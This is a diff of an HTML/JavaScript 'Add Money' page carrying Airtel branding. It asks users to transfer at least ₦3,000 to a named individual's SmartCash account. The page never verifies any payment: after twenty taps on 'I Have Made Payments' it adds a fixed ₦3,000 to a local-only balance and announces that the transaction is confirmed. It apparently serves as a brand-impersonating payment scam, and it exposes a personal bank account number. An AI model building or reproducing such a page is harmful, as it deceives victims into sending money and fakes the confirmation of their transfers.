@@ -1,172 +1,235 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Add Money</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>Add Money - Airtel Promo</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    html, body {
-      height: 100%;
-      overflow: hidden;
-      font-family: Arial, sans-serif;
-      background: #fff;
-    }
     body {
-      background-image: url('airtel-bg.png');
-      background-size: cover;
-      background-repeat: no-repeat;
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: #fff;
+      overflow: hidden;
       position: relative;
     }
-    .overlay {
-      position: absolute;
+
+    .background {
+      position: fixed;
       width: 100%;
       height: 100%;
-      background: rgba(255,255,255,0.8);
-      z-index: 1;
+      background: radial-gradient(circle, #ffffff, #ffe6e6);
+      overflow: hidden;
+      z-index: -1;
     }
+
+    .logo-piece {
+      position: absolute;
+      width: 30px;
+      height: 30px;
+      background-image: url('airtel-logo.png');
+      background-size: contain;
+      background-repeat: no-repeat;
+      animation: float 10s infinite;
+      opacity: 0.1;
+    }
+
+    @keyframes float {
+      0% {
+        transform: translateY(100vh) rotate(0deg);
+      }
+      100% {
+        transform: translateY(-100vh) rotate(360deg);
+      }
+    }
+
     .container {
-      position: relative;
-      z-index: 2;
-      padding: 20px;
+      padding: 2rem;
       text-align: center;
-      top: 5%;
     }
-    .airtel-logo {
-      width: 80px;
-      animation: scatterJoin 3s infinite;
-      margin: 0 auto 20px;
+
+    .logo {
+      width: 100px;
+      margin: 0 auto 1rem;
+      animation: scatterJoin 2s ease-out;
     }
+
     @keyframes scatterJoin {
-      0% { transform: scale(1.5) rotate(0deg); opacity: 0.2; }
-      50% { transform: scale(0.8) rotate(180deg); opacity: 0.8; }
-      100% { transform: scale(1) rotate(360deg); opacity: 1; }
+      0% { transform: scale(0.3) rotate(90deg); opacity: 0.2; }
+      100% { transform: scale(1) rotate(0deg); opacity: 1; }
     }
-    input[type="number"] {
+
+    input {
       width: 80%;
-      padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 18px;
+      padding: 1rem;
+      border: 2px solid red;
+      border-radius: 10px;
+      font-size: 1.2rem;
     }
+
     button {
+      margin-top: 1rem;
+      padding: 1rem 2rem;
       background: red;
-      color: #fff;
-      padding: 10px 20px;
+      color: white;
       border: none;
-      border-radius: 8px;
-      font-size: 18px;
+      border-radius: 10px;
+      font-size: 1.1rem;
       cursor: pointer;
     }
+
     .card {
-      margin-top: 20px;
-      background: rgba(255, 255, 255, 0.95);
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
-      display: none;
+      background: white;
+      padding: 2rem;
+      margin-top: 2rem;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+      position: relative;
     }
-    .copy-btn {
-      margin-top: 10px;
-      font-size: 14px;
-      background: #eee;
-      color: #333;
-    }
+
     .popup {
       position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #fff;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-      z-index: 10;
-      display: none;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
     }
+
+    .popup-content {
+      background: white;
+      padding: 2rem;
+      border-radius: 15px;
+      text-align: center;
+      max-width: 90%;
+      animation: fadeIn 0.3s ease-in;
+    }
+
+    @keyframes fadeIn {
+      from { transform: scale(0.5); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
     .confetti {
-      font-size: 32px;
-      animation: sparkle 1s infinite alternate;
+      font-size: 2rem;
     }
-    @keyframes sparkle {
-      from { opacity: 1; }
-      to { opacity: 0.3; }
+
+    .hidden {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <div class="overlay"></div>
-  <div class="container">
-    <img src="airtel-logo.png" class="airtel-logo" alt="Airtel Logo" />
-    <h2>Fund Wallet</h2>
-    <input type="number" id="amount" placeholder="Enter amount (Min ₦3000)" />
-    <br />
-    <button onclick="showAccount()">Continue</button><div class="card" id="accountCard">
-  <p><strong>Send to:</strong></p>
-  <p>EMMANUEL OKWUNNA</p>
-  <p>SmartCash PSB</p>
-  <p id="acct">8124890070</p>
-  <button class="copy-btn" onclick="copyAccount()">Copy Account Number</button>
-  <br><br>
-  <button onclick="tapped()">I have made payment</button>
-  <br><br>
-  <button onclick="window.location.href='dashboard.html'">Back to Dashboard</button>
-</div>
 
-  </div>  <div class="popup" id="popup">
-    <div class="confetti">🎉🎊🎉</div>
-    <h3 id="popupMsg"></h3>
-    <button onclick="redirectHome()">OK</button>
-  </div>  <script>
-    let tapCount = parseInt(localStorage.getItem("tapCount")) || 0;
-    const username = localStorage.getItem("username") || "User";
+  <div class="background" id="background"></div>
 
-    function showAccount() {
-      const amt = parseInt(document.getElementById("amount").value);
-      if (isNaN(amt) || amt < 3000) {
-        alert("Please input minimum of ₦3000");
+  <div class="container" id="inputSection">
+    <img src="airtel-logo.png" class="logo" alt="Airtel Logo" />
+    <h2>Enter Amount to Add</h2>
+    <input type="number" id="amountInput" placeholder="Minimum ₦3,000" />
+    <button onclick="continueProcess()">Continue</button>
+  </div>
+
+  <div class="card hidden" id="accountSection">
+    <img src="airtel-logo.png" style="width: 60px; margin-bottom: 1rem;" />
+    <h3>Make transfer to:</h3>
+    <p><strong>Emmanuel Okwunna</strong></p>
+    <p>SmartCash Payment Service Bank</p>
+    <p id="acctNum">8124890070 <button onclick="copyAcct()">Copy</button></p>
+    <button onclick="handlePayment()">I Have Made Payments</button>
+    <br/><br/>
+    <button onclick="location.href='dashboard.html'">Back to Dashboard</button>
+  </div>
+
+  <div class="popup hidden" id="popup">
+    <div class="popup-content" id="popupContent"></div>
+  </div>
+
+  <script>
+    let tapCount = parseInt(localStorage.getItem('tapCount')) || 0;
+    let balance = parseInt(localStorage.getItem('balance')) || 0;
+    let user = localStorage.getItem('username') || 'User';
+
+    const popup = document.getElementById('popup');
+    const popupContent = document.getElementById('popupContent');
+
+    function showPopup(message, withConfetti = false, redirect = false) {
+      popupContent.innerHTML = `
+        ${withConfetti ? '<div class="confetti">🎉🎊🎊</div>' : ''}
+        <p>${message}</p>
+        <br/>
+        <button onclick="closePopup(${redirect})">OK</button>
+      `;
+      popup.classList.remove('hidden');
+    }
+
+    function closePopup(redirect) {
+      popup.classList.add('hidden');
+      if (redirect) {
+        window.location.href = "dashboard.html";
+      }
+    }
+
+    function continueProcess() {
+      const amount = parseInt(document.getElementById("amountInput").value);
+      if (amount < 3000) {
+        showPopup("❌ Please input minimum of ₦3,000");
         return;
       }
-      document.getElementById("accountCard").style.display = "block";
+
+      showPopup("⏳ Please wait... confirming...", false);
+      setTimeout(() => {
+        popup.classList.add("hidden");
+        document.getElementById("inputSection").classList.add("hidden");
+        document.getElementById("accountSection").classList.remove("hidden");
+      }, 2000);
     }
 
-    function copyAccount() {
-      const acct = document.getElementById("acct").innerText;
-      navigator.clipboard.writeText(acct).then(() => alert("Account number copied!"));
-    }
-
-    function tapped() {
+    function handlePayment() {
       tapCount++;
-      localStorage.setItem("tapCount", tapCount);
+      localStorage.setItem('tapCount', tapCount);
 
       if (tapCount >= 20) {
-        // reset tap
-        localStorage.setItem("tapCount", 0);
+        tapCount = 0;
+        balance += 3000;
+        localStorage.setItem('balance', balance);
+        localStorage.setItem('tapCount', tapCount);
 
-        // update balance
-        let bal = parseInt(localStorage.getItem("balance")) || 0;
-        bal += 3000;
-        localStorage.setItem("balance", bal);
+        // Save to history
+        let history = JSON.parse(localStorage.getItem('history') || "[]");
+        history.push({
+          amount: 3000,
+          method: "Bank Transfer",
+          date: new Date().toLocaleString()
+        });
+        localStorage.setItem('history', JSON.stringify(history));
 
-        // add to history
-        const txns = JSON.parse(localStorage.getItem("transactions") || "[]");
-        txns.push({ type: "Fund", amount: 3000, date: new Date().toLocaleString() });
-        localStorage.setItem("transactions", JSON.stringify(txns));
-
-        // show popup
-        document.getElementById("popupMsg").innerText = `Dear ${username}, you have successfully funded your wallet with ₦3,000.`;
-        document.getElementById("popup").style.display = "block";
+        showPopup(`🎉 Dear ${user}, you have successfully funded your wallet with ₦3,000.<br>Your transaction is confirmed.`, true, true);
+      } else {
+        showPopup("⏳ We are confirming your transaction...");
+        setTimeout(() => popup.classList.add("hidden"), 1500);
       }
     }
 
-    function redirectHome() {
-      document.getElementById("popup").style.display = "none";
-      window.location.href = "dashboard.html";
+    function copyAcct() {
+      navigator.clipboard.writeText("8124890070");
+      showPopup("✅ Account number copied!");
     }
-  </script></body>
+
+    // Create floating logos
+    for (let i = 0; i < 40; i++) {
+      let el = document.createElement("div");
+      el.classList.add("logo-piece");
+      el.style.left = Math.random() * 100 + "vw";
+      el.style.top = Math.random() * 100 + "vh";
+      el.style.animationDuration = (5 + Math.random() * 10) + "s";
+      document.getElementById("background").appendChild(el);
+    }
+  </script>
+
+</body>
 </html>
